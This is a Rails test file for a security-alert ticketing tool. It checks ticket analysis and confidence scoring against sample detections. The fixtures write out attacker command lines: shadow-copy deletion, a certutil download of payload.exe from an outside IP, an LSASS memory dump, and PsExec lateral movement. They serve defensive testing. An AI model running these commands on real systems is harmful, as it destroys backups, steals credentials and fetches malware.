# frozen_string_literal: true

require "test_helper"

# Tests for PROBLEM 1 (Ticket Modal Generalization) and PROBLEM 2 (AI Confidence Score Fix)
class TicketModalAndConfidenceTest < ActiveSupport::TestCase
  setup do
    @analyst = User.create!(
      name: "Modal Test Analyst",
      email: "modal.confidence.test@sentriq.local",
      role: "analyst"
    )

    KnowledgeDocument.create!(
      title: "RB-TEST: PowerShell Execution Runbook",
      category: "runbook",
      content: "powershell encodedcommand indicates obfuscated malicious execution."
    )
  end

  # ── PROBLEM 1: Modal Generalization ─────────────────────────────────────────

  test "P1-1. ransomware ticket analysis opens and returns correct ticket ID" do
    det = Detection.create!(
      title: "Ransomware: Volume Shadow Copy Deletion",
      severity: "high", status: "new", hostname: "SRV-RANSOMWARE-01",
      process_name: "vssadmin.exe", process_id: 6604,
      command_line: "vssadmin.exe delete shadows /all /quiet",
      triggered_at: 2.minutes.ago
    )
    ticket = Ticket.create!(
      title: "Ransomware Detection Ticket",
      description: "vssadmin delete shadows detected",
      priority: "high", detection: det, user: @analyst
    )
    result = TicketContextualAnalyzerService.new(ticket: ticket, current_user: @analyst).call
    assert result[:success], "Ransomware ticket analysis must succeed"
    assert_equal ticket.id, result[:ticket].id
    assert_not_nil result[:analysis]["intent"]
    assert_not_nil result[:analysis]["confidence"]
  end

  test "P1-2. suspicious powershell event type ticket analysis opens successfully" do
    det = Detection.create!(
      title: "Suspicious Encoded PowerShell Spawned by Word",
      severity: "critical", status: "new", hostname: "WKSTN-PS-TEST-01",
      process_name: "powershell.exe", process_id: 4928,
      parent_process_name: "winword.exe",
      command_line: "powershell.exe -NoP -Enc SQBFAFgA",
      triggered_at: 5.minutes.ago
    )
    ticket = Ticket.create!(
      title: "PowerShell Obfuscated Execution",
      description: "powershell encodedcommand detected from winword",
      priority: "critical", detection: det, user: @analyst
    )
    result = TicketContextualAnalyzerService.new(ticket: ticket, current_user: @analyst).call
    assert result[:success]
    assert_equal ticket.id, result[:ticket].id
    assert_equal "active_threat_containment", result[:analysis]["intent"]
  end

  test "P1-3. certutil lolbin different event type opens successfully" do
    det = Detection.create!(
      title: "CertUtil Remote Ingress Download",
      severity: "high", status: "new", hostname: "SRV-CERTUTIL-01",
      process_name: "certutil.exe", process_id: 8840,
      command_line: "certutil.exe -urlcache -split -f https://203.0.113.88/payload.exe",
      triggered_at: 3.minutes.ago
    )
    ticket = Ticket.create!(
      title: "CertUtil Ingress Download", description: "certutil urlcache download",
      priority: "high", detection: det, user: @analyst
    )
    result = TicketContextualAnalyzerService.new(ticket: ticket, current_user: @analyst).call
    assert result[:success], "CertUtil event type must open successfully"
    assert_not_nil result[:analysis]["confidence"]
  end

  test "P1-4. unknown event type does not block modal - safe fallback works" do
    ticket = Ticket.create!(
      title: "Unknown Network Protocol Anomaly XYZ-9991",
      description: "Unrecognized event type with no matching runbook",
      priority: "low", user: @analyst
    )
    result = TicketContextualAnalyzerService.new(ticket: ticket, current_user: @analyst).call
    assert result[:success], "Unknown event must not block modal"
    assert_not_nil result[:analysis]["intent"]
    assert_includes %w[low medium high critical], result[:analysis]["priority"]
  end

  test "P1-5. each modal shows correct ticket record - no data bleed between tickets" do
    det_a = Detection.create!(
      title: "LSASS Credential Dump", severity: "critical", status: "new",
      hostname: "HOST-LSASS-01", process_name: "procdump.exe", process_id: 1111,
      command_line: "procdump.exe -ma lsass.exe dump.dmp", triggered_at: 1.minute.ago
    )
    det_b = Detection.create!(
      title: "Whoami Privilege Enum", severity: "low", status: "open",
      hostname: "HOST-WHOAMI-02", process_name: "whoami.exe", process_id: 2222,
      command_line: "whoami /priv", triggered_at: 5.minutes.ago
    )
    ticket_a = Ticket.create!(title: "LSASS Ticket", description: "mimikatz sekurlsa lsass",
      priority: "critical", detection: det_a, user: @analyst)
    ticket_b = Ticket.create!(title: "Whoami Ticket", description: "whoami privilege check",
      priority: "low", detection: det_b, user: @analyst)

    result_a = TicketContextualAnalyzerService.new(ticket: ticket_a, current_user: @analyst).call
    result_b = TicketContextualAnalyzerService.new(ticket: ticket_b, current_user: @analyst).call

    assert_equal ticket_a.id, result_a[:ticket].id, "Result A must be for ticket A"
    assert_equal ticket_b.id, result_b[:ticket].id, "Result B must be for ticket B"
    refute_equal result_a[:ticket].id, result_b[:ticket].id
  end

  test "P1-6. switching tickets clears previous data - no carryover" do
    ticket1 = Ticket.create!(title: "First - PowerShell Alert",
      description: "powershell encodedcommand", priority: "high", user: @analyst)
    ticket2 = Ticket.create!(title: "Second - Whoami Check",
      description: "whoami privilege check", priority: "low", user: @analyst)

    result1 = TicketContextualAnalyzerService.new(ticket: ticket1, current_user: @analyst).call
    result2 = TicketContextualAnalyzerService.new(ticket: ticket2, current_user: @analyst).call

    refute_equal result1[:ticket].id, result2[:ticket].id
    refute_nil result1[:analysis]["intent"]
    refute_nil result2[:analysis]["intent"]
  end

  test "P1-7. lateral movement ticket links to correct ticket ID" do
    det = Detection.create!(
      title: "Lateral Movement via PsExec", severity: "high", status: "new",
      hostname: "DC-LATERAL-01", process_name: "psexec.exe", process_id: 3412,
      command_line: "psexec.exe \\\\target cmd.exe", triggered_at: 2.minutes.ago
    )
    ticket = Ticket.create!(title: "PsExec Lateral Movement",
      description: "psexec lateral movement", priority: "high",
      detection: det, user: @analyst)
    result = TicketContextualAnalyzerService.new(ticket: ticket, current_user: @analyst).call
    assert result[:success]
    assert_equal ticket.id, result[:ticket].id
    assert_not_nil result[:analysis]["confidence"]
  end

  # ── PROBLEM 2: Confidence Score Tests ──────────────────────────────────────

  test "P2-1. confidence is not hardcoded - rich telemetry yields higher score" do
    det_rich = Detection.create!(
      title: "Rich Telemetry Detection", severity: "critical", status: "new",
      hostname: "HOST-RICH-01", process_name: "powershell.exe", process_id: 9999,
      parent_process_name: "winword.exe", ip_address: "10.0.0.99",
      command_line: "powershell.exe -Enc SQBFAFgA",
      file_hash: "aabbccdd11223344", triggered_at: 2.minutes.ago
    )
    det_rich.evidences.create!([
      { evidence_type: "network_connection", occurred_at: 2.minutes.ago, description: "Outbound TCP 8080" },
      { evidence_type: "file_write", occurred_at: 1.minute.ago, description: "Dropped payload" }
    ])
    ticket_rich = Ticket.create!(title: "Rich Telemetry Ticket",
      description: "powershell encodedcommand", priority: "critical",
      detection: det_rich, user: @analyst)
    ticket_sparse = Ticket.create!(title: "Sparse Generic Alert",
      description: "General triage no detection", priority: "medium", user: @analyst)

    result_rich   = TicketContextualAnalyzerService.new(ticket: ticket_rich, current_user: @analyst).call
    result_sparse = TicketContextualAnalyzerService.new(ticket: ticket_sparse, current_user: @analyst).call

    conf_rich   = result_rich[:analysis]["confidence"].to_i
    conf_sparse = result_sparse[:analysis]["confidence"].to_i

    assert conf_rich > conf_sparse,
      "Rich (#{conf_rich}) must be higher than sparse (#{conf_sparse})"
  end

  test "P2-2. mock LLM confidence of 73 survives schema validation" do
    payload = {
      "severity" => "high", "confidence" => 73,
      "classification" => "active_threat_containment",
      "evidence" => ["Process: powershell.exe"],
      "reasoning" => "Obfuscated execution detected",
      "matched_runbook" => "RB-0105: Obfuscated PowerShell",
      "recommended_action" => "Isolate host",
      "requires_human_approval" => true
    }
    validated = TicketAnalysisSchemaValidator.validate(payload)
    assert_equal 73, validated["confidence"]
  end

  test "P2-3. different event inputs yield different confidence scores" do
    t1 = Ticket.new(title: "PowerShell Attack", description: "powershell encodedcommand", priority: "high")
    t2 = Ticket.new(title: "Retrospective drill", description: "tatbikat tamamlandi", priority: "low")
    a1 = ContextualAnalysisEngine.new(t1, []).generate_analysis
    a2 = ContextualAnalysisEngine.new(t2, []).generate_analysis
    refute_equal a1[:confidence], a2[:confidence],
      "Attack (#{a1[:confidence]}) and retrospective (#{a2[:confidence]}) must differ"
  end

  test "P2-4. missing confidence triggers schema validation error" do
    payload = {
      "severity" => "medium", "confidence" => nil,
      "classification" => "inquiry", "evidence" => ["obs"],
      "reasoning" => "Unknown", "matched_runbook" => "None",
      "recommended_action" => "Review", "requires_human_approval" => false
    }
    assert_raises(TicketAnalysisSchemaValidator::ValidationError) do
      TicketAnalysisSchemaValidator.validate(payload)
    end
  end

  test "P2-5. previous ticket confidence does not carry over" do
    ticket_high = Ticket.create!(title: "Critical PowerShell Beaconing",
      description: "powershell encodedcommand beacon c2", priority: "critical", user: @analyst)
    ticket_low  = Ticket.create!(title: "Routine Admin Whoami",
      description: "whoami priv check routine", priority: "low", user: @analyst)

    result_high = TicketContextualAnalyzerService.new(ticket: ticket_high, current_user: @analyst).call
    result_low  = TicketContextualAnalyzerService.new(ticket: ticket_low, current_user: @analyst).call

    refute_equal result_high[:ticket].id, result_low[:ticket].id
    assert result_high[:analysis]["confidence"].to_i.between?(40, 95)
    assert result_low[:analysis]["confidence"].to_i.between?(40, 95)
  end

  test "P2-6. severity and confidence are distinct independent fields" do
    det = Detection.create!(
      title: "Critical but Limited Evidence Attack",
      severity: "critical", status: "new", hostname: "HOST-CRITICAL-LOW",
      process_name: "unknown.exe", process_id: 1234, triggered_at: 1.minute.ago
    )
    ticket = Ticket.create!(title: "Critical Low Evidence Ticket",
      description: "Critical severity minimal telemetry", priority: "critical",
      detection: det, user: @analyst)
    result = TicketContextualAnalyzerService.new(ticket: ticket, current_user: @analyst).call
    analysis = result[:analysis]

    assert_not_nil analysis["severity"]
    assert_not_nil analysis["confidence"]
    assert_includes %w[low medium high critical], analysis["severity"].to_s
    assert analysis["confidence"].to_i.between?(40, 95)
    assert analysis["confidence_note"].present?, "confidence_note must exist"
  end

  test "P2-7. every analysis is linked to correct ticket ID" do
    ticket = Ticket.create!(title: "ID Tracking Ticket",
      description: "powershell execution for tracking", priority: "high", user: @analyst)
    result = TicketContextualAnalyzerService.new(ticket: ticket, current_user: @analyst).call
    assert_equal ticket.id, result[:ticket].id
    assert_equal ticket.ticket_number, result[:ticket].ticket_number
  end

  test "P2-8. same input produces deterministic consistent output" do
    ticket = Ticket.create!(title: "Deterministic Drill Test",
      description: "tatbikat tamamlandi", priority: "low", user: @analyst)
    engine = ContextualAnalysisEngine.new(ticket, [])
    a1 = engine.generate_analysis
    a2 = engine.generate_analysis
    assert_equal a1[:intent], a2[:intent], "Same input must yield same intent"
    assert_equal a1[:confidence], a2[:confidence], "Same input must yield same confidence"
  end
end
